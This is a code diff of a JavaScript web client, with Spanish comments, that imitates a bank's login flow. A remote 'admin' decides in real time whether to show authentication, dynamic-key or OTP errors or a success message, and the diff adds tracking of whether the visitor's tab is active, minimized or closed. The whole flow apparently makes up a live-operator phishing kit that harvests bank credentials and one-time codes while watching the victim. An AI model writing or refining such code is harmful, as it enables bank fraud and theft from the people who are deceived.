@@ -50,18 +50,56 @@
         }
     }
 
+    // =========================
+    // ✅ PRESENCE (ACTIVE/MINIMIZED/INACTIVE)
+    // =========================
+
+    function emitPresence(state) {
+        try {
+            if (socket && socket.connected)
+                socket.emit("user:presence", { state });
+        } catch {}
+    }
+
+    function beaconPresence(state) {
+        try {
+            if (!RT.nodeUrl || !RT.sessionId) return;
+
+            // nodeUrl: "http://localhost:3005"
+            const url = `${RT.nodeUrl}/api/sessions/${RT.sessionId}/presence`;
+            const body = JSON.stringify({ state });
+            const blob = new Blob([body], { type: "application/json" });
+            navigator.sendBeacon(url, blob);
+        } catch {}
+    }
+
+    // ✅ Cuando se oculta/muestra la pestaña
+    document.addEventListener("visibilitychange", () => {
+        if (!RT.sessionId) return;
+        if (document.visibilityState === "hidden") emitPresence("MINIMIZED");
+        else emitPresence("ACTIVE");
+    });
+
+    // ✅ Cuando se cierra la pestaña / navega fuera
+    window.addEventListener("pagehide", () => beaconPresence("INACTIVE"));
+    window.addEventListener("beforeunload", () => beaconPresence("INACTIVE"));
+
+    // =========================
+    // ✅ SOCKET CORE
+    // =========================
+
     function bindListeners(socket) {
         if (!socket || boundSocket === socket) return;
         boundSocket = socket;
 
         socket.on("connect", () => {
             isConnecting = false;
+            // ✅ al conectar, quitar loading siempre (si estaba por init o por submit)
 
-            const hadPending = pendingEmits.length > 0;
             flushQueue();
-
-            // si solo era conexión de pantalla, quita loading
-            if (!hadPending) safeHideLoading();
+            safeHideLoading();
+            // ✅ presencia activa al conectar
+            emitPresence("ACTIVE");
         });
 
         socket.on("connect_error", (err) => {
@@ -71,6 +109,15 @@
             window.showBankAlert?.(
                 "error_custom",
                 "Error de conexión. Intenta nuevamente."
+            );
+        });
+
+        window.addEventListener("blur", () => emitPresence("MINIMIZED"));
+        window.addEventListener("focus", () => emitPresence("ACTIVE"));
+
+        document.addEventListener("visibilitychange", () => {
+            emitPresence(
+                document.visibilityState === "hidden" ? "MINIMIZED" : "ACTIVE"
             );
         });
 
@@ -84,12 +131,6 @@
 
             const action = String(s.action);
 
-            if (RT._awaiting && !RT._seenWait) {
-                if (RT._awaiting === "AUTH" && action === "AUTH_ERROR") return;
-                if (RT._awaiting === "DINAMIC" && action === "DINAMIC_ERROR")
-                    return;
-                if (RT._awaiting === "OTP" && action === "OTP_ERROR") return;
-            }
             console.log(action);
             const expected = RT.actionToScreen[action];
             const current = RT.step;
@@ -129,9 +170,13 @@
 
             // ✅ SOLO redirigir cuando NO sea WAIT (cuando el admin ya decidió)
             // 1) WAIT: solo loading, no navegar
-
+                if (RT._awaiting && !RT._seenWait) {
+                    if (RT._awaiting === "AUTH" && action === "AUTH_ERROR") return;
+                }
             // 2) AUTH_ERROR: guardar error + ir a step1
+            
             if (action === "AUTH_ERROR") {
+                safeHideLoading();
                 if (s?.lastError) {
                     try {
                         sessionStorage.setItem(
@@ -147,8 +192,7 @@
             if (action === "DINAMIC_ERROR") {
                 safeHideLoading();
 
-                const msg =
-                    s?.lastError || "Error. Intenta nuevamente.";
+                const msg = s?.lastError || "Error. Intenta nuevamente.";
 
                 // ✅ Si YA estás en step3, NO recargues la página: solo muestra alerta
                 if (String(RT.step) === "3") {
@@ -216,7 +260,7 @@
                 ) {
                     setTimeout(() => {
                         // Muestra mensaje de éxito
-                        safeHideLoading();  
+                        safeHideLoading();
                         showBankAlert?.("success", "Autenticación exitosa.");
                         setTimeout(() => {
                             hideBankAlert();
@@ -311,6 +355,7 @@
         // ✅ si ya hay socket conectado, reutiliza
         if (socket && socket.connected) {
             bindListeners(socket);
+            // ✅ al entrar a una pantalla con socket vivo, marca ACTIVE
             return;
         }
 
@@ -320,18 +365,15 @@
         safeShowLoading("Conectando...");
         isConnecting = true;
 
-        // desconecta viejo si existe
-        try {
-            socket?.disconnect();
-        } catch {}
-
         socket = io(nodeUrl, {
             transports: ["websocket"],
             auth: { token: sessionToken },
+            autoConnect: false, // ✅ clave: no conectes aún
         });
 
         window.RT_SOCKET = socket;
-        bindListeners(socket);
+        bindListeners(socket); // ✅ primero bind
+        socket.connect();      // ✅ l
     };
 
     // Expuesto: registra callback por pantalla
@@ -342,6 +384,8 @@
     // ✅ Expuesto SIEMPRE: emite aunque no haya conectado aún (lo encola)
     // ✅ Esta es la pieza clave: si no hay conexión, la crea y encola el emit
     window.rtEmitSubmit = function (eventName, payload, ackCb) {
+        console.log("sessionToken:", RT.sessionToken);
+
         safeShowLoading("Cargando...");
 
         // ✅ marcar qué flujo está esperando
@@ -354,7 +398,7 @@
         if (!socket || !socket.connected) {
             pendingEmits.push({ eventName, payload, ackCb });
 
-            if (RT.nodeUrl && RT.sessionToken) {
+            if (RT.nodeUrl && (RT.sessionToken)) {
                 window.initSocketConnection(
                     RT.nodeUrl,
                     RT.sessionId,
